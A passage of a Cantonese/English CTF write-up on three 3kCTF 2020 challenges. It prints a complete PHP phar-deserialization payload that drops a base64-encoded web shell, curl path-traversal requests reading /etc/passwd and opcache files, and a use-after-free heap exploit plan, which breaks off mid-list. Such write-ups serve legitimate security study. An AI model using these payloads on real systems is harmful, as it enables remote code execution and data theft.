&lt;p&gt;Scroll down [Don&#39;t translate that &amp;quot;D&amp;quot;, you can&#39;t] that index.php, we can see &lt;code&gt;file_get_contents&lt;/code&gt;. It immediately links to phar unserialize&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;有個 &lt;code&gt;upload.php&lt;/code&gt; 真係可以 upload 野. 不過會 check &lt;code&gt;getimagesize&lt;/code&gt; 同 &lt;code&gt;image/jpeg&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is an &lt;code&gt;upload.php&lt;/code&gt; that can really upload things. But it checks with &lt;code&gt;getimagesize&lt;/code&gt; and &lt;code&gt;image/jpeg&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;睇返個 &lt;code&gt;old.php&lt;/code&gt;, 又係驗眼嘅時間. 最底有個 &lt;code&gt;$data = &amp;quot;&amp;lt;?php\n//&amp;quot; . sprintf(&#39;%012d&#39;, $expire) . &amp;quot;\n exit();?&amp;gt;\n&amp;quot; . $data;&lt;/code&gt; 但係無咩用.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Let&#39;s go back to &lt;code&gt;old.php&lt;/code&gt; and check our eyesight. The bottom &lt;code&gt;$data = &amp;quot;&amp;lt;?php...&lt;/code&gt; looks interesting but unless.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;除非個 &lt;code&gt;sprintf(&#39;%012d&#39;, $expire)&lt;/code&gt; 可以整走個 &lt;code&gt;exit()&lt;/code&gt; 啦.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Unless &lt;code&gt;sprintf(&#39;%012d&#39;, $expire)&lt;/code&gt; could be used to get rid of that &lt;code&gt;exit()&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;再碌上 D 見到個詭異嘅 variable function &lt;code&gt;return $serialize($data);&lt;/code&gt;. 咁開心.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Scroll up a bit then we can see a weird variable function &lt;code&gt;return $serialize($data);&lt;/code&gt;. So exciting.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所以如果將 &lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]&lt;/code&gt; 改做 &lt;code&gt;system&lt;/code&gt; 就可以行 &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;So if we set &lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt; then we could run &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;但係個 &lt;code&gt;$data&lt;/code&gt; 要點砌呢. 根據所謂 POP 可以 trace 到:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;But how can we control &lt;code&gt;$data&lt;/code&gt;? According to the so-called Property-Oriented Programming, you can trace like this:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]($data) //cl2-&amp;gt;serialize&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;$this-&amp;gt;serialize($value) //cl2-&amp;gt;set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;$this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $this-&amp;gt;getForStorage(), $this-&amp;gt;expire); //cl1-&amp;gt;save&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;return json_encode([$this-&amp;gt;cleanContents($this-&amp;gt;cache), $this-&amp;gt;complete]); //cl1-&amp;gt;getForStorage()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;首先個 &lt;code&gt;$data&lt;/code&gt; 有少少限制. 因為係 &lt;code&gt;json_encode&lt;/code&gt; 個 Array.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;First, the &lt;code&gt;$data&lt;/code&gt; is a bit restricted. Because it is constructed by &lt;code&gt;json_encode&lt;/code&gt;-ing an array.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;不過你想用 &lt;code&gt;system&lt;/code&gt; 行 command 其實可以好求其. 好似咩 &lt;code&gt;$(ls)&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;But if you just need to use &lt;code&gt;system&lt;/code&gt; to execute command, it is pretty flexible. Like using &lt;code&gt;$(ls)&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;最後可以砌到好似 &lt;code&gt;system(&#39;[&amp;quot;$(ls)&amp;quot;,0]&#39;)&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;At the end of the day we should be able to construct like &lt;code&gt;system(&#39;[&amp;quot;$(ls)&amp;quot;,0]&#39;)&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;要 trigger &lt;code&gt;cl1-&amp;gt;save&lt;/code&gt;, destructor 個 &lt;code&gt;$this-&amp;gt;autosave&lt;/code&gt; 要 false.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you want to trigger &lt;code&gt;cl1-&amp;gt;save&lt;/code&gt;, in the destructor, &lt;code&gt;$this-&amp;gt;autosave&lt;/code&gt; should be false.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;依家有齊啲餡啦. 要搵返 phar 個 payload.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;We are cooking with gas. Now we need to get the phar payload.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;邊鬼個會記得點寫. 抄返自己個威噏.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Who the heck will remember how to write the payload. Just copy my own write-up.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine&#34;&gt;https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;由 &lt;code&gt;$p = new Phar(&#39;malware.phar&#39;);&lt;/code&gt; 果行抄起 (好似係)&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Copy the payload starting from &lt;code&gt;$p = new Phar(&#39;malware.phar&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;上面記得抄返個 Class definition 同埋改晒 D property 佢.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Remember to copy the class definitions and change the properties to the desired one.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;個 &lt;code&gt;getimagesize&lt;/code&gt; 同 &lt;code&gt;image/jpeg&lt;/code&gt; 點算? 求其攝個 jpg 向頭咪得囉.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;How to tackle &lt;code&gt;getimagesize&lt;/code&gt; and &lt;code&gt;image/jpeg&lt;/code&gt;? Just inject a jpg file in front.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;h2 id=&#34;final-payload&#34;&gt;Final payload&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class cl1 {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = &amp;#39;flysystem&amp;#39;, $expire = null) {
        $this-&amp;gt;key = $key;
        $this-&amp;gt;store = $store;
        $this-&amp;gt;expire = $expire;
        //add your own properties
        $this-&amp;gt;cache = [&amp;#39;$(echo PD89YCRfR0VUWzBdYDs= | base64 -d &amp;gt; /var/www/html/up/z.php)&amp;#39;];
        $this-&amp;gt;autosave = 0;
        $this-&amp;gt;complete = 0;
    }
}

class cl2 {
    public function __construct(){
    	//add your own properties
    	$this-&amp;gt;options[&amp;#39;serialize&amp;#39;] = &amp;#34;system&amp;#34;;
    	$this-&amp;gt;writeTimes = 0;
     	$this-&amp;gt;options[&amp;#39;prefix&amp;#39;] = &amp;#39;&amp;#39;;
     	$this-&amp;gt;options[&amp;#39;data_compress&amp;#39;] = 0;
    }
}

$x = new cl1(new cl2(),&amp;#34;z&amp;#34;,0);
$p = new Phar(&amp;#39;malware.phar&amp;#39;);
$p-&amp;gt;startBuffering();
$p-&amp;gt;addFromString(&amp;#34;z&amp;#34;,&amp;#34;&amp;#34;);
$j = file_get_contents(&amp;#34;1.jpg&amp;#34;);
$p-&amp;gt;setStub($j.&amp;#34;&amp;lt;?php __HALT_COMPILER(); ? &amp;gt;&amp;#34;);
$p-&amp;gt;setMetadata($x);
$p-&amp;gt;stopBuffering();
$file = file(&amp;#39;malware.phar&amp;#39;);&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;

&lt;p&gt;之後 upload 個「圖」, 出返個 &amp;quot;filename.jpg&amp;quot;. 之後讀 &lt;code&gt;php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Then upload that &amp;quot;image&amp;quot;, will return &amp;quot;filename.jpg&amp;quot;. Then access &lt;code&gt;php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;之後點玩自己諗啦. 提示: 估下 &lt;code&gt;PD89YCRfR0VUWzBdYDs=&lt;/code&gt; 係咩先.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The rest is left as an exercise for the readers. (Hint: decode &lt;code&gt;PD89YCRfR0VUWzBdYDs=&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;remark&#34;&gt;Remark&lt;/h2&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-28-3kctf/image-uploader-troIl.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;呢題咁易都搞咗我個半鐘真係失敗。&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-28-3kctf/image-uploader-trolI.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/confus3r/status/1286850105513930752&#34;&gt;https://twitter.com/confus3r/status/1286850105513930752&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;慘。早啲起身咪有 First Blood (好似係&lt;/p&gt;

&lt;h2 id=&#34;carthagods-web-496-points&#34;&gt;carthagods (Web; 496 points)&lt;/h2&gt;

&lt;p&gt;Author: rekter0, Dali&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Salute the carthagods!&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rinlo/ctf-writeups/tree/master/2020/3kCTF-2020/carthagods/src&#34;&gt;redacted source&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;The challenge provided the redacted sourcecode as hints.&lt;/p&gt;

&lt;p&gt;.htaccess&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;...
RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;...
&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;$_GET[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;REDACTED&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;]){
    $file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;REDACTED&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;];
    $f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;thecarthagods/&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;lt;\?php/i&amp;#34;&lt;/span&gt;, $f)){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $f;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;php content detected&amp;#39;&lt;/span&gt;;
    }
  }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The php script accepts user provided &lt;code&gt;$file&lt;/code&gt; path without any sanitation, however the GET parameter is redacted.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;.htaccess&lt;/code&gt; file rewrite the path to index.php with the GET parameter. Lets try the folder &lt;code&gt;thecarthagods&lt;/code&gt; as shown in the php file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl http://carthagods.3k.ctf.to:8039/thecarthagods&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We got the token&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;301 Moved Permanently&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;Moved Permanently&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;The document has moved &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;.&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;hr&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;address&lt;/span&gt;&amp;gt;Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;address&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With the token we can do path traversal&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However we cannot print the content of &lt;code&gt;flag.php&lt;/code&gt; directly&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;textarea class=&amp;#34;label-input100&amp;#34; style=&amp;#34;color:black;width: 100%;height: 300px;&amp;#34;&amp;gt;php content detected             &amp;lt;/textarea&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;From the phpinfo provided we can know opcache is enabled, with &lt;code&gt;opcache.file_cache&lt;/code&gt; set to &lt;code&gt;/var/www/cache/&lt;/code&gt;. Maybe we can get the compiled version of &lt;code&gt;flag.php&lt;/code&gt; and get its content.&lt;/p&gt;

&lt;p&gt;The opcache will store the cache in the format &lt;code&gt;/var/www/cache/&amp;lt;system_id&amp;gt;/path/to/file.php.bin&lt;/code&gt;, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.&lt;/p&gt;

&lt;p&gt;The system ID is: &lt;code&gt;e2c6579e4df1d9e77e36d2f4ff8c92b3&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin&amp;#34;&lt;/span&gt; --output -&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;...
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;label-input100&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;color:black;width: 100%;height: 300px;&amp;#34;&lt;/span&gt;&amp;gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!=
VPyi0���Y�Į��{�opcache_get_statush���JK��&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt;3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;560&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;315&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.youtube.com/embed/y8zZXMLBin4&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;frameborder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allowfullscreen&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt;&amp;gt;֖|�flag                                          &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;linker-pwn-493-points&#34;&gt;linker (Pwn; 493 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;program&#34;&gt;Program&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~/3kctf/linker# ./linker
Welcome to your secret journal!
Provide name size:
8
Provide a name:
abcd
Welcome abcd
! What would you like to do?
1- Get new blank page
2- Edit page content
3- Empty a page
4- Relogin
5- Exit
&amp;gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This seems to be a heap challenge, which allow user to &lt;em&gt;create&lt;/em&gt;, &lt;em&gt;edit&lt;/em&gt; and &lt;em&gt;free&lt;/em&gt; a chunk. Also, it provides a weird function (i.e., &lt;em&gt;relogin&lt;/em&gt;) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.&lt;/p&gt;

&lt;h3 id=&#34;vulnerability&#34;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;In &lt;code&gt;3- Empty a page&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide page index:&amp;#34;&lt;/span&gt;);
read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;4uLL&lt;/span&gt;);
idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong index kiddo...&amp;#34;&lt;/span&gt;);
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( check_pages[idx] )
{
  free(pages[idx]);
  check_pages[idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// vuln
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;number_pages;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After freed a chunk, only the &lt;code&gt;check[idx]&lt;/code&gt; is set to 0; and in &lt;em&gt;Edit page content&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide page index:&amp;#34;&lt;/span&gt;);
read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;4uLL&lt;/span&gt;);
idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong index kiddo...&amp;#34;&lt;/span&gt;);
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( pages[idx] ) &lt;span style=&#34;color:#75715e&#34;&gt;// not checked
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide new page content:&amp;#34;&lt;/span&gt;);
  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, pages[idx], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)page_size[idx]);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Edit function won&#39;t check &lt;code&gt;check[idx]&lt;/code&gt;, which means we can overwrite a free chunk.&lt;/p&gt;

&lt;h3 id=&#34;exploit-1&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;As we can overwrite any data into the free chunk, we can perform some attack to overwrite &lt;code&gt;__malloc_hook&lt;/code&gt; or &lt;code&gt;__free_hook&lt;/code&gt; with one gadget rce.&lt;/p&gt;

&lt;p&gt;However, we had two problems.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;tcache techniques won&#39;t work with calloc

&lt;ul&gt;
&lt;li&gt;Solution: We filled up tcache and perform fastbin attack.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Theres are no show functions to leak libc addresses

&lt;ul&gt;
